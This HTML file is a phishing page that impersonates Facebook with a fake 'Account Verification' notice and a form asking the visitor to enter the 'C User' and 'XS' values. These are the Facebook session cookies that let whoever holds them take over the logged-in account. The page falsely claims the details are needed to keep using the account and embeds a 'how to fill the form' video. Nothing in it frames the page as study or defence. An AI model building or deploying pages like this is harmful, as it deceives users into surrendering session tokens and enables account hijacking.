<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Submit Form - Facebook Style</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="container">
        <!-- Facebook logo section -->
        <header class="header">
            <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo" class="facebook-logo">
        </header>

        <!-- Info Section -->
        <div class="info-section">
            <h1>Account Verification</h1>
            <p>To continue using your Facebook account, please fill in the following details.</p>
        </div>

        <!-- Form Section -->
        <div class="form-section">
            <form action="#" method="POST">
                <div class="input-group">
                    <label for="c-user">C User</label>
                    <input type="text" id="c-user" name="c-user" placeholder="Enter C User" required>
                </div>
                <div class="input-group">
                    <label for="xs">XS</label>
                    <input type="text" id="xs" name="xs" placeholder="Enter XS" required>
                </div>
                <button type="submit" class="submit-btn">Submit</button>
            </form>
        </div>

        <!-- Video Section -->
        <div class="video-section">
            <h2>How to Fill the Form</h2>
            <iframe src="https://www.youtube.com/embed/dQw4w9WgXcQ" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
        </div>

        <!-- Additional Information -->
        <div class="additional-info">
            <p>If you encounter any issues, please refer to the guide or reach out to our support team for further assistance.</p>
        </div>
    </div>
</body>
</html>
